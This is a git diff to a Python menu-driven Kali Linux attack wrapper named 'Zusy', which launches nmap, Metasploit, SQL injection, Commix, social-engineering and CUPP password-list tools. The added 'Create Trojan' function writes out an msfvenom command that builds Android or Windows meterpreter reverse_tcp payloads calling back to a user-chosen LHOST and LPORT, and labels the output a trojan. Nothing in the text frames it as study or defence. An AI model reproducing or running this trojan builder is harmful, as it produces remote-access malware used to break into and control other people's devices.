@@ -1,9 +1,60 @@
+# Credits
+# Creator : No_Name.exe
+# Zusy
+
 from subprocess import run, PIPE
 import os
 
 def clear_screen():
     os.system('clear')
 
+def create_trojan():
+    clear_screen()
+    print("[0] Back\n")
+    print("[1] Android")
+    print("[2] Windows")
+    
+    platform_choice = input("Which operating system do you want to create for? (1/2): ")
+    
+    if platform_choice == "0":
+        main_menu()
+    
+    platform = ""
+    file_extension = ""
+    
+    if platform_choice == "1":
+        platform = "android"
+        file_extension = "apk"
+    elif platform_choice == "2":
+        platform = "windows"
+        file_extension = "exe"
+    else:
+        print("Invalid choice.")
+        create_trojan()
+    
+    clear_screen()
+    lhost = input("LHOST = ")
+    lport = input("LPORT = ")
+    
+    filedirectory = input("Please enter the file name: ")
+    clear_screen()
+    
+    trojan_command = f"msfvenom -p {platform}/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {filedirectory}.{file_extension}"
+    
+    print("Please wait...")
+                    
+    process = run(trojan_command, shell=True)
+    if process.returncode == 0:
+        print(f"Trojan created! File directory => {os.getcwd()}/{filedirectory}.{file_extension}")
+    else:
+        print("Trojan creation failed.")
+        
+    input("\nPress Enter to continue...")
+    main_menu()
+
+
+
+    
 def nmap_scan():
     clear_screen()
     print("[0] Back\n")
@@ -18,7 +69,7 @@ def nmap_scan():
     else:
         print("Nmap scan completed.")
     input("\nPress Enter to go back...")
-    main_menu()
+    main_menu()    
     
 def sql_scan():
     clear_screen()
@@ -57,17 +108,35 @@ def open_metasploit():
     clear_screen()
     process = run("msfconsole -q", shell=True)
     
+def cupp_open():
+    clear_screen()
+    process = run("cupp -i", shell=True)    
+    
 def update_kali():
     clear_screen()
     process = run("sudo apt update && sudo apt upgrade", shell=True)    
     
+def ifconfig():
+    clear_screen()
+    process = run("ifconfig", shell=True)
+    if process.stdout is not None:
+        print(process.stdout.decode())
+    else:
+        print("")
+    input("\nPress Enter to go back...")
+    main_menu()    
+    
 def kali_undercover():
     clear_screen()
-    process = run("kali-undercover", shell=True)    
+    process = run("kali-undercover && python3 OpenZusy.py", shell=True)    
     
+import subprocess
+
 def reboot_system():
     clear_screen()
-    process = run("sudo reboot", shell=True)    
+    input("Press Enter to continue...")
+    process = subprocess.run("sudo reboot", shell=True)
+  
 
 def social_engineering():
     clear_screen()
@@ -82,10 +151,11 @@ def main_menu():
       ─╔╝╔╝║║─║╠══╗║╚╗╔╝─
       ╔╝═╚═╣╚═╝║╚═╝║─║║──
       ╚════╩═══╩═══╝─╚╝──
-------{ By No_Name.exe }------
+-------{ By No_Name.exe }-------
+                        v 1.1
     """
     print(logo)
-    print("[1] Nmap Scan\n[2] Open Metasploit\n[3] Social Engineering\n[4] SQL Injection\n[5] Commix\n[6] Restart System\n[7] Become Windows (on/off)\n[8] Upgrade System\n[99] Exit\n")
+    print("[1] Nmap Scan\n[2] Open Metasploit\n[3] Social Engineering\n[4] SQL Injection\n[5] Commix\n[6] Restart System\n[7] Become Windows (on/off)\n[8] Upgrade System\n[9] Password Found\n[10] System About\n[11] Create Trojan\n[99] Exit\n")
     choice = input("Zusy ~$ ")
 
     if choice == "1":
@@ -103,7 +173,13 @@ def main_menu():
     elif choice == "7":
         kali_undercover()  
     elif choice == "8":
-        update_kali()            
+        update_kali()   
+    elif choice == "9":
+        cupp_open() 
+    elif choice == "10":
+        ifconfig()      
+    elif choice == "11":
+        create_trojan()               
     elif choice == "99":
         print("\nThanks For Using!!!")
     else:
